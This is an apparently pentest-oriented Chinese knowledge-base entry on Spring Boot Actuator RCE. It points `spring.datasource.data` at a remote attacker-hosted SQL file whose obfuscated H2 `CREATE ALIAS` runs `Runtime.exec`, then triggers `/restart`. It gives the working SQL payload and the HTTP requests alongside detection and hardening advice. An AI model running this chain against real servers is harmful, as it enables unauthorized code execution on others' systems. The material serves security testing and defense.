---
id: web-java-framework-spring-actuator-restart-spring-datasource-data-h2-sql-rce
title: Spring Boot Actuator restart + spring.datasource.data 加载远程 SQL：H2 CREATE ALIAS 编译 Java 执行命令
type: scenario
domain: web
path: web/java/framework/spring
technique: actuator-restart-datasource-data-h2-create-alias-rce
aliases:
- spring.datasource.data
- H2 CREATE ALIAS
- Actuator restart H2 RCE
- SQL 初始化脚本远程加载
- spring-boot-starter-data-jpa
tags:
- java
- spring
- spring-boot
- actuator
- restart
- h2
- jpa
- sql
- create-alias
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:34:13+08:00'
  notes: 已对照原文核对：/env 写 spring.datasource.data 远程 exp.sql、H2 CREATE ALIAS CONCAT 拆分 Runtime.exec + CALL T5、/restart 触发、h2+data-jpa 依赖条件均与原文一致；原文无执行截图，未复跑。
---

## 一句话结论

Spring Boot 的 `/env` 可写且 `/restart` 开启、应用同时具备 H2 与 `spring-boot-starter-data-jpa` 时，攻击者把 `spring.datasource.data` 指向远程 `.sql` 文件并触发重启；Spring Boot 的数据源初始化器会执行该脚本，H2 的 `CREATE ALIAS ... AS 'Java 源码'` 会编译并注册 Java 方法，`CALL` 时执行 `Runtime.getRuntime().exec(...)`，形成 RCE。

## 原理

- `spring.datasource.data` 是 Spring Boot 旧版用于指定数据源初始化 SQL 脚本（`data.sql`）的属性；应用启动/重启时，`DataSourceInitializer`（或在 JPA 场景下由 `DataSourceInitializerInvoker` 触发）会读取该位置并对 DataSource 执行 SQL。
- H2 支持 `CREATE ALIAS <name> AS <Java 方法源码>`：H2 会把字符串里的 Java 方法编译成类并注册为数据库函数，随后 `CALL <name>(...)` 即执行该方法。方法体内可直接写 `Runtime.getRuntime().exec(...)`。
- 原文的 payload 用 `CONCAT('void ex(...){Runti','me.getRun','time().exe','c(...);}')` 在 SQL 层拼接源码，把 `Runtime.getRuntime().exec` 拆成多段字符串，规避某些关键字检测；随后 `CALL T5('/bin/bash','-c','calc')` 执行命令。
- 触发点仍是 `/restart`：修改 `spring.datasource.data` 后重启，初始化器重新执行远程 SQL。1.x 需 `endpoints.restart.enabled=true`，2.x 需 `management.endpoint.restart.enabled=true`。
- 原文要求环境存在 `h2database` 与 `spring-boot-starter-data-jpa` 相关依赖；JPA 的存在会让数据源初始化在启动/重启阶段被触发（否则需要 `spring.datasource.initialization-mode` 等配置配合）。

## 触发条件

- `/env`（1.x）或 `/actuator/env`（2.x）未授权可写；`/restart` 或 `/actuator/restart` 已开启并可访问。
- classpath 存在 H2 与 `spring-boot-starter-data-jpa`，且数据源初始化会执行 `spring.datasource.data` 指定的脚本。
- 目标能出站访问攻击者的 HTTP 服务。
- 应用未对 `spring.datasource.data` 做来源白名单。

## 利用步骤

1. 探测 `/env`/`/actuator/env` 可写与 `/restart`/`/actuator/restart` 可达；确认 classpath 有 H2 与 JPA（可从 `/env` 的依赖/配置来源判断）。
2. 在攻击机准备 `exp.sql`：

```sql
CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');
CALL T5('/bin/bash','-c','calc');
```

3. 启动 HTTP 服务托管该文件。
4. 写入 `spring.datasource.data=http://attacker:8000/exp.sql`：
   - 1.x：`POST /env`（表单）；
   - 2.x：`POST /actuator/env`（表单或 JSON）。
5. 访问 `/restart` 或 `/actuator/restart`，应用重启时执行远程 SQL，H2 编译 `T5` 并 `CALL` 执行命令。
6. 测试后恢复 `spring.datasource.data` 原值；该操作会重启业务，必须先取得授权。

## PoC

```sql
-- exp.sql
CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');
CALL T5('/bin/bash','-c','calc');
```

```http
### 1.x 写入
POST /env HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

spring.datasource.data=http://attacker:8000/exp.sql
```

```http
### 2.x 写入
POST /actuator/env HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

spring.datasource.data=http://attacker:8000/exp.sql
```

```http
### 触发重启
POST /actuator/restart HTTP/1.1
Host: target
```

## 变体与关联

- 变体：H2 的 `CREATE ALIAS` 也可用 `AS $$ ... $$` 写 Java 源码，或用 `org.h2.util.JdbcUtils` 等其他危险函数；不同 H2 版本对 `CREATE ALIAS` 的权限/语法有差异。
- 变体：`spring.datasource.schema` 同样可指定初始化脚本，若可写也可作为入口。
- 关联：[[web-java-component-h2-cve-2022-23221-forbid-creation-bypass-init-rce]]（H2 JDBC URL `INIT` 执行 SQL 的另一入口）、[[web-java-component-h2-jre-only-create-alias-static-method-rce]]（`CREATE ALIAS` 静态方法 RCE 的通用原理）、[[web-java-framework-spring-actuator-restart-logging-config-groovy-rce]]（同一 `/restart` 触发模式，sink 换成 Groovy 脚本）。
- 边界：`/env` 只读或需认证、`/restart` 未开启、无 H2/JPA、数据源初始化被关闭（`spring.datasource.initialization-mode=never` 等）或目标不能出站时，该链不成立。

## 检测与防御

- 检测：`/env`、`/actuator/env` 出现 `spring.datasource.data` 或 `spring.datasource.schema` 写入且值为外部 URL；随后 `/restart` 与对外的 HTTP 请求；应用日志出现 H2 `CREATE ALIAS`/`CALL` 与 `Runtime.exec`。
- 防御：关闭或鉴权 Actuator 的 `env`、`restart` 端点；生产环境不开启 restart。
- 防御：数据源初始化脚本只允许 classpath 本地路径，禁止 `http(s)://`；不需要时设置 `spring.datasource.initialization-mode=never`。
- 加固：生产环境移除 H2；限制应用出站访问；对 H2 `CREATE ALIAS` 相关 SQL 做监控与告警。
